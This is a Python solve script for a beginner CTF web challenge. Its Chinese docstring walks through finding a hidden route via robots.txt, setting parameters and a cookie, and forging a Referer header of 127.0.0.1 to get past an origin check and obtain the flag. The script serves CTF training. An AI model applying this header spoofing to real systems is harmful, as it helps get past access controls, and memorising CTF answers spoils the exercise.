#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
题目 3 · 一切的开始 (Web, 833pts, author: inex)

考点：一串"工具/手法"链，每一步都用不同的 HTTP 传参姿势：
  1. GET    /            -> "不知道干什么？扫扫目录康康？"
  2. GET    /robots.txt  -> Disallow: /inex233  (告知隐藏路由)
  3. GET    /inex233                -> 请get传参aaa=flag
  4. GET    /inex233?aaa=flag       -> 请post传参bbb=flag
  5. POST   /inex233?aaa=flag  (form bbb=flag)
                                    -> 要带上sweet的小饼干
  6. ... + Cookie: sweet=sweet      -> 你必须来自127.0.0.1
  7. ... + Referer: http://127.0.0.1/  -> 请json传参web：flag
  8. ... + Content-Type: application/json  body {"bbb":"flag","web":"flag"}
                                    -> 0xGame{...}

用法:
    python3 scripts/3-solve.py [base_url]
"""
import sys
import urllib.request
import json

BASE = sys.argv[1] if len(sys.argv) > 1 else \
    "http://5000-365cce0f-591a-4afb-8d26-4d8ef97c7735.challenge.ctfplus.cn"

URL = BASE.rstrip("/") + "/inex233?aaa=flag"
BODY = json.dumps({"bbb": "flag", "web": "flag"}).encode()

req = urllib.request.Request(URL, data=BODY, method="POST")
req.add_header("Content-Type", "application/json")
req.add_header("Cookie", "sweet=sweet")
req.add_header("Referer", "http://127.0.0.1/")

with urllib.request.urlopen(req, timeout=15) as r:
    out = r.read().decode("utf-8", "replace").strip()

print(out)
